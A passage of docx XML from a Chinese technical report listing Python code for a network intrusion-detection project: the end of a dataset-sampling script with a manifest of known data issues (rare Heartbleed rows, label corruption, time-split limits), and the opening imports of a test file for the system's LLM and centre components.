          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "source_dir": str(raw_dir),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17311A31">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "source_files": [p.name for p in files],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4B5DE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "seed": args.seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4F3372">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "rows": int(len(out)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FECB29">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "columns": int(out.shape[1]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A0A96A4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "quota": quota,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EA3E713">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "class_counts": {c: int(final.get(c, 0)) for c in classes},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C0BBAE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "source_class_totals": {c: int(totals[c]) for c in classes},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B2293C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "sampling": "per-class quota (stratified across files), not proportional",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69356AD4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "source_column": "__source__",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C35B6B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "order_column": "__order__",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F81BCEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "known_issues": [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AC6C4AA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "全量 2,830,743 行中 Heartbleed 仅 11 行，按比例抽样会把它抹掉，故稀有类全收；"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A4F89E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "训练集类别先验因此高于真实分布，本样本上的准确率不能当作线上准确率。",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C68FF3A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "Kaggle 上的这三个 Web Attack 标签里的 en dash 已被写坏成 U+FFFD（2180 处），"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43EEDBE6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "它们不属于六类，抽取时已被丢弃。",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16B0A512">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "列名已去掉首尾空格（原文件形如 ' Destination Port'）。",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712426EE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "__source__ 列记录了每行来自哪个原始 CSV，训练时不作特征（双下划线开头一律剔除），"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D9913F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "用于按天/按文件划分的跨天评估。",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064DB349">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "__order__ 列是全局时间序号，按'天 -&gt; 文件内行号'递增（文件名字母序不等于时间序），"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A696EC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "用于按时间留出。注意每个攻击类只占一段连续时间窗：DoS Hulk 集中在 Wednesday 文件前"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39A27CD0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "半段（分位 0.13/0.28/0.46）、Heartbleed 全在 0.86 处，所以整段按时间切会让 DoS Hulk"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B380609">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "全部落进训练侧、Heartbleed 全部落进测试侧。跨天留出同理不可行——每个攻击类只出现在"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F788430">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            "一天的文件里。可行的口径是按类内部时间顺序留出（见 models/train.py --split temporal）。",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12ABDA87">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        ],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D943064">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299C9610">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    mpath = out_path.with_name(out_path.stem + "_manifest.json")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640A4D19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    mpath.write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E716689">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    print(f"[清单] {mpath}", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D26F01D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEA37F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1045F0A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0700BBDC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E129B46">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCB49AA">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="662B9485">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-25　tests/test_llm_and_center.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（170 行）　大模型层与中心接口联测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F32055E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""大模型层与中心端自测：输出结构、检索、推理契约、存储往返。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141FDD10">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C727679">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>不联网：LLM 客户端只测解析与降级路径，不测真实调用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFDC474">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA4974F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E2DA97A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02BF7908">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from pathlib import Path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203CDA51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77A890B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26E98A8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pytest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7797175F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A81A1BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from center.database import FLOW_DISPLAY_FIELDS, Store</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61DFFFF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from center.inference import Detector, escalate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AB13B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from llm.rag import Retriever, tokenize</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49321FC0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from llm.schema import parse_diagnosis, validate, RISK_LEVELS</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C86028">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from probe.features import FEATURE_ORDER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457D0F66">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="16A4B806">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ROOT = Path(__file__).resolve().parent.parent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E72BE9F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>MODEL = ROOT / "models" / "artifacts" / "best_model.pkl"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25E558DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>SCHEMA = ROOT / "models" / "artifacts" / "feature_schema.json"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31FDBEDC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>CHUNKS = ROOT / "data" / "rag" / "chunks.json"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36080FA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EC950F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7170A864">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 输出结构</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9B20E7">
      <w:pPr>
